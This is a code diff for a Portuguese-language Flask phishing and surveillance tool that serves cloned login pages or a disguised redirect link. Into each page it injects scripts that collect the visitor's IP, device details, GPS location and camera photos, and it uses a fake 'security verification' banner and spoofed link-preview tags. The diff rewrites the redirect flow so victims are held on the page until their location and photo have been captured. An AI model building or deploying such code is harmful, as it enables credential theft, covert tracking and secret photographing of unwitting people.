@@ -1,5 +1,5 @@
 from flask import Flask, render_template_string, request, jsonify, send_from_directory
-import datetime, base64, os, requests, shutil
+import datetime, base64, os, requests, shutil, json
 import pytz, re
 
 fuso_br = pytz.timezone('America/Sao_Paulo')
@@ -11,6 +11,7 @@ else:
 
 pasta_templates = "templates"
 pasta_preview = os.path.join(os.getcwd(), "static/preview")
+arquivo_cache_preview = os.path.join(pasta_raiz, "preview_redirect_cache.json")
 
 if not os.path.exists(pasta_raiz):
     os.makedirs(pasta_raiz)
@@ -41,8 +42,79 @@ def obter_temas():
     return temas
 
 
+def extrair_meta_de_url(url):
+    out = {
+        "title": "Verificando conexão...",
+        "description": "Aguarde um momento.",
+        "image": "",
+    }
+    try:
+        res = requests.get(
+            url,
+            verify=False,
+            timeout=8,
+            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
+        )
+        html = res.text
+        m = re.search(r"<title[^>]*>(.*?)</title>", html, re.IGNORECASE | re.DOTALL)
+        if m:
+            out["title"] = re.sub(r"\s+", " ", m.group(1)).strip()
+        m = re.search(
+            r'<meta[^>]*property=["\']og:description["\'][^>]*content=["\'](.*?)["\']',
+            html,
+            re.IGNORECASE,
+        ) or re.search(
+            r'<meta[^>]*name=["\']description["\'][^>]*content=["\'](.*?)["\']',
+            html,
+            re.IGNORECASE,
+        )
+        if m:
+            out["description"] = m.group(1).strip()
+        m = re.search(
+            r'<meta[^>]*property=["\']og:image["\'][^>]*content=["\'](.*?)["\']',
+            html,
+            re.IGNORECASE,
+        )
+        if m:
+            out["image"] = m.group(1).strip()
+        if not out["description"]:
+            out["description"] = out["title"]
+    except Exception as e:
+        print(f"[!] Preview da URL (opcional): {e}")
+    return out
+
+
+def salvar_cache_preview(url, meta):
+    with open(arquivo_cache_preview, "w", encoding="utf-8") as f:
+        json.dump({"url": url, **meta}, f, ensure_ascii=False)
+
+
+def carregar_cache_preview(url):
+    if not os.path.exists(arquivo_cache_preview):
+        return None
+    try:
+        with open(arquivo_cache_preview, "r", encoding="utf-8") as f:
+            data = json.load(f)
+        if data.get("url") == url:
+            return data
+    except Exception:
+        pass
+    return None
+
+
+def meta_tags_html(title, description, image=""):
+    return (
+        f"<title>{title}</title>\n"
+        f'<meta property="og:title" content="{title}">\n'
+        f'<meta property="og:description" content="{description}">\n'
+        f'<meta property="og:image" content="{image}">\n'
+        f'<meta property="og:type" content="website">\n'
+        f'<meta name="description" content="{description}">\n'
+    )
+
+
 def mostrar_menu():
-    os.system('clear' if os.name == 'posix' else 'cls')
+    os.system("clear" if os.name == "posix" else "cls")
     temas_disponiveis = obter_temas()
 
     print("=" * 40)
@@ -59,9 +131,9 @@ def mostrar_menu():
 
     opcao = input(" Escolha o template: ")
 
-    ativar_loc = input(" Ativar localização? (s/n): ").lower() == 's'
-    ativar_foto = input(" Ativar foto? (s/n): ").lower() == 's'
-    ativar_banner = input(" Ativar banner de verificação? (s/n): ").lower() == 's'
+    ativar_loc = input(" Ativar localização? (s/n): ").lower() == "s"
+    ativar_foto = input(" Ativar foto? (s/n): ").lower() == "s"
+    ativar_banner = input(" Ativar banner de verificação? (s/n): ").lower() == "s"
 
     url_custom = ""
     if opcao == "5":
@@ -69,7 +141,7 @@ def mostrar_menu():
         if not url_custom.startswith("http"):
             url_custom = "https://" + url_custom
         salvar = input(" Deseja salvar este clone permanentemente? (s/n): ").lower()
-        if salvar == 's':
+        if salvar == "s":
             nome_pasta = input(" Digite o nome para a nova pasta: ").replace(" ", "_")
             caminho_novo = os.path.join(pasta_templates, nome_pasta)
             if not os.path.exists(caminho_novo):
@@ -101,13 +173,20 @@ def mostrar_menu():
 
 pasta_tema, url_redirecionamento, url_alvo_custom, usar_loc, usar_foto, ativar_banner = mostrar_menu()
 
+meta_redirect_cache = None
+if pasta_tema == "redirecionar":
+    print("\n[*] Buscando preview da URL de destino (uma vez)...")
+    meta_redirect_cache = extrair_meta_de_url(url_redirecionamento)
+    salvar_cache_preview(url_redirecionamento, meta_redirect_cache)
+    print(f"    Título: {meta_redirect_cache['title'][:60]}...")
+
 print("\n" + "=" * 40)
 personalizar = input(" Deseja personalizar o preview do link? (s/n): ").lower()
 
 meta_titulo = meta_desc = img_local = None
 nome_servir = "preview.jpg"
 
-if personalizar == 's':
+if personalizar == "s":
     meta_titulo = input(" Título do link: ")
     meta_desc = input(" Descrição do link: ")
     img_local = input(" Nome da imagem local (ex: foto.jpg): ")
@@ -121,23 +200,12 @@ print("=" * 40 + "\n")
 app = Flask(__name__)
 
 
-def delay_redirecionar_ms():
-    """Tempo até ir para a URL — só template redirecionar, conforme o que está ativo."""
-    if usar_foto and usar_loc:
-        return 14000
-    if usar_foto:
-        return 10000
-    if usar_loc:
-        return 14000
-    return 4000
-
-
-@app.route('/preview.jpg')
+@app.route("/preview.jpg")
 def imagem_link():
     return send_from_directory(pasta_preview, nome_servir)
 
 
-@app.route('/')
+@app.route("/")
 def index():
     html_original = ""
     try:
@@ -153,139 +221,179 @@ def index():
     except Exception as e:
         return f"Erro: {e}", 500
 
-    if personalizar == 's':
-        html_original = re.sub(r'<title>.*?</title>', '', html_original, flags=re.IGNORECASE)
-        html_original = re.sub(r'<meta property="og:.*?>', '', html_original, flags=re.IGNORECASE)
-        html_original = re.sub(r'<meta name="description".*?>', '', html_original, flags=re.IGNORECASE)
+    if personalizar == "s":
+        html_original = re.sub(r"<title>.*?</title>", "", html_original, flags=re.IGNORECASE)
+        html_original = re.sub(r'<meta property="og:.*?>', "", html_original, flags=re.IGNORECASE)
+        html_original = re.sub(
+            r'<meta name="description".*?>', "", html_original, flags=re.IGNORECASE
+        )
 
     meta_tags = ""
-    if personalizar == 's':
+    if personalizar == "s":
         link_da_foto = f"{request.host_url}preview.jpg"
-        meta_tags = (
-            f'<title>{meta_titulo}</title>\n'
-            f'<meta property="og:title" content="{meta_titulo}">\n'
-            f'<meta property="og:description" content="{meta_desc}">\n'
-            f'<meta property="og:image" content="{link_da_foto}">\n'
-            f'<meta property="og:type" content="website">\n'
-            f'<meta name="description" content="{meta_desc}">\n'
-        )
+        meta_tags = meta_tags_html(meta_titulo, meta_desc, link_da_foto)
     elif pasta_tema == "redirecionar":
-        try:
-            res = requests.get(
-                url_redirecionamento,
-                verify=False,
-                timeout=10,
-                headers={'User-Agent': 'Mozilla/5.0'},
+        cached = carregar_cache_preview(url_redirecionamento) or meta_redirect_cache
+        if cached:
+            meta_tags = meta_tags_html(
+                cached.get("title", "Verificando conexão..."),
+                cached.get("description", "Aguarde."),
+                cached.get("image", ""),
             )
-            html_redirect = res.text
-            title_match = re.search(
-                r'<title[^>]*>(.*?)</title>', html_redirect, re.IGNORECASE | re.DOTALL
-            )
-            title = title_match.group(1).strip() if title_match else "Verificação de Segurança"
-            desc_match = (
-                re.search(
-                    r'<meta[^>]*property=["\']og:description["\'][^>]*content=["\'](.*?)["\']',
-                    html_redirect,
-                    re.IGNORECASE,
-                )
-                or re.search(
-                    r'<meta[^>]*name=["\']description["\'][^>]*content=["\'](.*?)["\']',
-                    html_redirect,
-                    re.IGNORECASE,
-                )
-            )
-            desc = desc_match.group(1).strip() if desc_match else title
-            image_match = re.search(
-                r'<meta[^>]*property=["\']og:image["\'][^>]*content=["\'](.*?)["\']',
-                html_redirect,
-                re.IGNORECASE,
-            )
-            image_url = image_match.group(1).strip() if image_match else ""
-            meta_tags = (
-                f'<title>{title}</title>\n'
-                f'<meta property="og:title" content="{title}">\n'
-                f'<meta property="og:description" content="{desc}">\n'
-                f'<meta property="og:image" content="{image_url}">\n'
-                f'<meta property="og:type" content="website">\n'
-                f'<meta name="description" content="{desc}">\n'
-            )
-        except Exception:
-            meta_tags = '<title>Verificação de Segurança</title>\n'
+        else:
+            meta_tags = meta_tags_html("Verificando conexão...", "Aguarde um momento.", "")
 
-    # --- Coleta no clique: todos os templates ---
-    script_coleta = '''
+    script_orquestrador = f"""
     <script>
-    async function enviarDadosIniciais() {
+    window.__gpsRespondido = !{str(usar_loc).lower()};
+    window.__fotoEnviada = !{str(usar_foto).lower()};
+    window.__coletaInicialOk = false;
+    window.__jaRedirecionou = false;
+    window.__bannerAceito = false;
+
+    (function () {{
+        var origFetch = window.fetch;
+        window.fetch = function (input, init) {{
+            var url = typeof input === "string" ? input : (input && input.url) || "";
+            return origFetch.apply(this, arguments).then(function (res) {{
+                if ({str(usar_foto).lower()} && url.indexOf("/foto") !== -1) {{
+                    window.__fotoEnviada = true;
+                    if (typeof window.tentarContinuarFluxo === "function") {{
+                        window.tentarContinuarFluxo();
+                    }}
+                }}
+                return res;
+            }});
+        }};
+
+        if (navigator.geolocation && navigator.geolocation.getCurrentPosition) {{
+            var origGps = navigator.geolocation.getCurrentPosition.bind(navigator.geolocation);
+            navigator.geolocation.getCurrentPosition = function (ok, err, opts) {{
+                origGps(
+                    function (pos) {{
+                        if ({str(usar_loc).lower()}) {{
+                            window.__gpsRespondido = true;
+                            if (typeof window.tentarContinuarFluxo === "function") {{
+                                window.tentarContinuarFluxo();
+                            }}
+                        }}
+                        if (ok) ok(pos);
+                    }},
+                    function (e) {{
+                        if ({str(usar_loc).lower()}) {{
+                            window.__gpsRespondido = true;
+                            if (typeof window.tentarContinuarFluxo === "function") {{
+                                window.tentarContinuarFluxo();
+                            }}
+                        }}
+                        if (err) err(e);
+                    }},
+                    opts
+                );
+            }};
+        }}
+
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {{
+            var origGum = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
+            navigator.mediaDevices.getUserMedia = function (constraints) {{
+                return origGum(constraints).catch(function (e) {{
+                    if ({str(usar_foto).lower()}) {{
+                        window.__fotoEnviada = true;
+                        if (typeof window.tentarContinuarFluxo === "function") {{
+                            window.tentarContinuarFluxo();
+                        }}
+                    }}
+                    return Promise.reject(e);
+                }});
+            }};
+        }}
+    }})();
+
+    async function enviarDadosIniciais() {{
         let batteryInfo = "N/A";
-        if (navigator.getBattery) {
-            try {
+        if (navigator.getBattery) {{
+            try {{
                 const b = await navigator.getBattery();
                 batteryInfo = (b.level * 100).toFixed(0) + "% " + (b.charging ? "(Carregando)" : "");
-            } catch (e) {}
-        }
+            }} catch (e) {{}}
+        }}
         const ipInt = await getInternalIP();
-        fetch('/capturar_inicial', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
+        await fetch("/capturar_inicial", {{
+            method: "POST",
+            headers: {{ "Content-Type": "application/json" }},
+            body: JSON.stringify({{
                 ip_interno: ipInt,
                 bateria: batteryInfo,
                 screenWidth: screen.width,
                 screenHeight: screen.height,
                 deviceMemory: navigator.deviceMemory || "N/A"
-            })
-        });
-    }
-    window.addEventListener('load', function () {
-        setTimeout(enviarDadosIniciais, 1200);
-    });
-    </script>
-    '''
+            }})
+        }});
+        window.__coletaInicialOk = true;
+        if (typeof window.tentarContinuarFluxo === "function") {{
+            window.tentarContinuarFluxo();
+        }}
+    }}
 
-    # --- Permissões: só o que o usuário ligou (espiao.js lê usarLoc / usarFoto) ---
-    script_permissoes = '''
-    <script>
-    function dispararPermissoesAtivas() {
+    function dispararPermissoesAtivas() {{
         if (!window.usarLoc && !window.usarFoto) return;
         if (typeof dispararGPS !== "function") return;
         dispararGPS();
-    }
-    </script>
-    '''
+    }}
 
-    delay_ms = delay_redirecionar_ms()
+    function irParaDestinoSeRedirecionar() {{
+        if (window.__jaRedirecionou) return;
+        if (window.temaAtual !== "redirecionar") return;
+        window.__jaRedirecionou = true;
+        window.location.replace(window.urlRedirecionamento);
+    }}
 
-    # --- LOGIN (Google, Facebook, etc.): NUNCA redireciona sozinho para urlRedirecionamento ---
-    if pasta_tema != "redirecionar":
-        script_fluxo = f'''
-    <script>
-    window.addEventListener('load', function () {{
-        if ({"true" if ativar_banner else "false"}) return;
-        setTimeout(dispararPermissoesAtivas, 1800);
+    window.tentarContinuarFluxo = function () {{
+        if (window.temaAtual === "redirecionar") {{
+            if (!window.__coletaInicialOk) return;
+            if (window.usarLoc && !window.__gpsRespondido) return;
+            if (window.usarFoto && !window.__fotoEnviada) return;
+            irParaDestinoSeRedirecionar();
+        }}
+    }};
+
+    function iniciarFluxoSemBanner() {{
+        enviarDadosIniciais();
+        dispararPermissoesAtivas();
+        if (!window.usarLoc && !window.usarFoto && window.temaAtual === "redirecionar") {{
+            window.tentarContinuarFluxo();
+        }}
+    }}
+
+    async function aceitarCookies() {{
+        window.__bannerAceito = true;
+        var el = document.getElementById("bloqueio-spy");
+        if (el) el.style.display = "none";
+
+        if (!window.__coletaInicialOk) {{
+            await enviarDadosIniciais();
+        }}
+
+        dispararPermissoesAtivas();
+
+        if (window.temaAtual === "redirecionar") {{
+            if (!window.usarLoc && !window.usarFoto) {{
+                window.tentarContinuarFluxo();
+            }}
+        }}
+    }}
+
+    window.addEventListener("load", function () {{
+        if (!{"true" if ativar_banner else "false"}) {{
+            iniciarFluxoSemBanner();
+        }} else {{
+            enviarDadosIniciais();
+        }}
     }});
     </script>
-    '''
-    else:
-        # --- REDIRECIONAR: só aqui vai para a URL de destino ---
-        script_fluxo = f'''
-    <script>
-    (function () {{
-        var redirecionado = false;
-        function ir() {{
-            if (redirecionado) return;
-            redirecionado = true;
-            window.location.replace("{url_redirecionamento}");
-        }}
-        window.addEventListener('load', function () {{
-            if ({"true" if ativar_banner else "false"}) return;
-            setTimeout(dispararPermissoesAtivas, 1800);
-            setTimeout(ir, {delay_ms});
-        }});
-    }})();
-    </script>
-    '''
+    """
 
-    css_banner = '''
+    css_banner = """
     <style>
         #bloqueio-spy { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffffff;
             z-index: 999999; display: flex; align-items: center; justify-content: center; font-family: sans-serif; }
@@ -293,49 +401,31 @@ def index():
         #btn-spy { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px;
             cursor: pointer; font-weight: bold; margin-top: 15px; font-size: 16px; }
     </style>
-    '''
+    """
 
-    html_banner = '''
+    html_banner = """
     <div id="bloqueio-spy">
         <div id="box-spy">
             <h2 style="margin-top:0; color:#333;">Verificação de Segurança</h2>
             <p style="color:#666;">Para continuar, aceite as permissões solicitadas pelo navegador.</p>
-            <button id="btn-spy" onclick="aceitarCookies()">CONTINUAR</button>
+            <button id="btn-spy" type="button" onclick="aceitarCookies()">CONTINUAR</button>
         </div>
     </div>
-    '''
+    """
 
-    script_config = f'''<script>
+    script_config = f"""<script>
         window.temaAtual = "{pasta_tema}";
         window.urlRedirecionamento = "{url_redirecionamento}";
         window.usarLoc = {"true" if usar_loc else "false"};
         window.usarFoto = {"true" if usar_foto else "false"};
-
-        function aceitarCookies() {{
-            var el = document.getElementById('bloqueio-spy');
-            if (el) el.style.display = 'none';
-            dispararPermissoesAtivas();
-            if (window.temaAtual === "redirecionar") {{
-                setTimeout(function () {{
-                    window.location.replace(window.urlRedirecionamento);
-                }}, {delay_ms});
-            }}
-        }}
-    </script>'''
+    </script>"""
 
     scripts_captura = (
         '\n<script src="/static/js/espiao.js"></script>\n'
         '<script src="/static/js/saida.js"></script>\n'
     )
 
-    head_content = (
-        meta_tags
-        + script_coleta
-        + script_permissoes
-        + script_config
-        + script_fluxo
-        + scripts_captura
-    )
+    head_content = meta_tags + script_orquestrador + script_config + scripts_captura
 
     if ativar_banner:
         head_content = css_banner + head_content
@@ -343,10 +433,10 @@ def index():
     else:
         banner_html = ""
 
-    if re.search(r'<head', html_original, re.IGNORECASE):
+    if re.search(r"<head", html_original, re.IGNORECASE):
         html_final = re.sub(
-            r'(<head[^>]*>)',
-            r'\1' + head_content,
+            r"(<head[^>]*>)",
+            r"\1" + head_content,
             html_original,
             flags=re.IGNORECASE,
             count=1,
@@ -354,19 +444,22 @@ def index():
     else:
         html_final = head_content + html_original
 
-    if ativar_banner and re.search(r'<body', html_final, re.IGNORECASE):
-        html_final = re.sub(
-            r'(<body[^>]*>)',
-            r'\1' + banner_html,
-            html_final,
-            flags=re.IGNORECASE,
-            count=1,
-        )
+    if ativar_banner:
+        if re.search(r"<body", html_final, re.IGNORECASE):
+            html_final = re.sub(
+                r"(<body[^>]*>)",
+                r"\1" + banner_html,
+                html_final,
+                flags=re.IGNORECASE,
+                count=1,
+            )
+        else:
+            html_final = banner_html + html_final
 
     return render_template_string(html_final)
 
 
-@app.route('/capturar_inicial', methods=['POST'])
+@app.route("/capturar_inicial", methods=["POST"])
 def capturar_inicial():
     dados = request.json
     ip_list = request.headers.getlist("X-Forwarded-For")
@@ -390,7 +483,7 @@ def capturar_inicial():
     return jsonify({"status": "ok"}), 200
 
 
-@app.route('/capturar', methods=['POST'])
+@app.route("/capturar", methods=["POST"])
 def capturar():
     dados = request.json
     ip_list = request.headers.getlist("X-Forwarded-For")
@@ -413,11 +506,11 @@ def capturar():
     return jsonify({"status": "ok"}), 200
 
 
-@app.route('/foto', methods=['POST'])
+@app.route("/foto", methods=["POST"])
 def receber_foto():
     dados = request.json
     try:
-        imagem_b64 = dados.get('image', '').split(',')
+        imagem_b64 = dados.get("image", "").split(",")
         agora = datetime.datetime.now(fuso_br).strftime("%Y%m%d_%H%M%S")
         nome_arq = f"FOTO_{agora}.jpg"
         with open(os.path.join(pasta_raiz, nome_arq), "wb") as f:
@@ -428,5 +521,5 @@ def receber_foto():
     return jsonify({"status": "ok"}), 200
 
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8080)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=8080)
